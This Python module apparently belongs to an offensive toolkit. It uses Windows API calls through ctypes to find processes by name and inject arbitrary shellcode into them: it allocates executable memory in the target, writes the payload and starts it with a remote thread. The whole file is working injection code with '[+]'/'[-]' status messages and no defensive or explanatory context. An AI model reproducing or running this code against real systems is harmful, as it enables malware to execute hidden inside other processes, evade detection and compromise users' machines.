import os


def _get_winapi():
    if os.name != 'nt':
        return None
    import ctypes
    from ctypes import wintypes

    class _WinAPI:
        kernel32 = ctypes.windll.kernel32
        advapi32 = ctypes.windll.advapi32

        PROCESS_VM_OPERATION = 0x0008
        PROCESS_VM_WRITE = 0x0020
        PROCESS_CREATE_THREAD = 0x0002
        PROCESS_QUERY_INFORMATION = 0x0400

        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        MEM_RELEASE = 0x8000
        PAGE_EXECUTE_READWRITE = 0x40

        TH32CS_SNAPPROCESS = 0x00000002
        INFINITE = 0xFFFFFFFF

        @classmethod
        def find_process_by_name(cls, name):
            pids = []
            try:
                snapshot = cls.kernel32.CreateToolhelp32Snapshot(cls.TH32CS_SNAPPROCESS, 0)
                if snapshot == -1:
                    return pids

                class PROCESSENTRY32(ctypes.Structure):
                    _fields_ = [
                        ('dwSize', wintypes.DWORD),
                        ('cntUsage', wintypes.DWORD),
                        ('th32ProcessID', wintypes.DWORD),
                        ('th32DefaultHeapID', ctypes.POINTER(wintypes.ULONG)),
                        ('th32ModuleID', wintypes.DWORD),
                        ('cntThreads', wintypes.DWORD),
                        ('th32ParentProcessID', wintypes.DWORD),
                        ('pcPriClassBase', wintypes.LONG),
                        ('dwFlags', wintypes.DWORD),
                        ('szExeFile', wintypes.CHAR * 260),
                    ]

                pe = PROCESSENTRY32()
                pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
                if cls.kernel32.Process32First(snapshot, ctypes.byref(pe)):
                    while True:
                        exe_name = pe.szExeFile.decode('utf-8', errors='replace').lower()
                        if name.lower() in exe_name:
                            pids.append(pe.th32ProcessID)
                        if not cls.kernel32.Process32Next(snapshot, ctypes.byref(pe)):
                            break
                cls.kernel32.CloseHandle(snapshot)
            except Exception:
                pass
            return pids

        @classmethod
        def inject_shellcode(cls, pid, shellcode):
            try:
                h_process = cls.kernel32.OpenProcess(
                    cls.PROCESS_CREATE_THREAD | cls.PROCESS_VM_OPERATION |
                    cls.PROCESS_VM_WRITE | cls.PROCESS_QUERY_INFORMATION,
                    False, pid
                )
                if not h_process:
                    return False
                size = len(shellcode)
                addr = cls.kernel32.VirtualAllocEx(
                    h_process, None, size, cls.MEM_COMMIT | cls.MEM_RESERVE,
                    cls.PAGE_EXECUTE_READWRITE
                )
                if not addr:
                    cls.kernel32.CloseHandle(h_process)
                    return False
                written = ctypes.c_size_t(0)
                if not cls.kernel32.WriteProcessMemory(
                    h_process, addr, shellcode, size, ctypes.byref(written)
                ):
                    cls.kernel32.VirtualFreeEx(h_process, addr, 0, cls.MEM_RELEASE)
                    cls.kernel32.CloseHandle(h_process)
                    return False
                thread_id = wintypes.DWORD(0)
                h_thread = cls.kernel32.CreateRemoteThread(
                    h_process, None, 0, addr, None, 0, ctypes.byref(thread_id)
                )
                if not h_thread:
                    cls.kernel32.VirtualFreeEx(h_process, addr, 0, cls.MEM_RELEASE)
                    cls.kernel32.CloseHandle(h_process)
                    return False
                cls.kernel32.WaitForSingleObject(h_thread, cls.INFINITE)
                cls.kernel32.CloseHandle(h_thread)
                cls.kernel32.CloseHandle(h_process)
                return True
            except Exception:
                return False

    return _WinAPI


def inject_shellcode(pid, shellcode):
    if os.name != 'nt':
        return '[-] Process injection is Windows-only'
    try:
        pid = int(pid)
    except (ValueError, TypeError):
        return '[-] Invalid PID'
    WinAPI = _get_winapi()
    if WinAPI and WinAPI.inject_shellcode(pid, shellcode):
        return f'[+] Shellcode injected into PID {pid}'
    return f'[-] Injection failed for PID {pid}'


def inject_into_process(process_name, shellcode):
    if os.name != 'nt':
        return '[-] Process injection is Windows-only'
    WinAPI = _get_winapi()
    if WinAPI is None:
        return '[-] Windows API not available'
    pids = WinAPI.find_process_by_name(process_name)
    if not pids:
        return f'[-] Process not found: {process_name}'
    results = []
    for pid in pids:
        r = inject_shellcode(pid, shellcode)
        results.append(r)
    return '\n'.join(results)


def find_process(name):
    if os.name != 'nt':
        return '[-] Process search is Windows-only'
    WinAPI = _get_winapi()
    if WinAPI is None:
        return '[-] Windows API not available'
    pids = WinAPI.find_process_by_name(name)
    if not pids:
        return f'[-] No process found: {name}'
    return f'[+] PIDs for "{name}": {", ".join(map(str, pids))}'
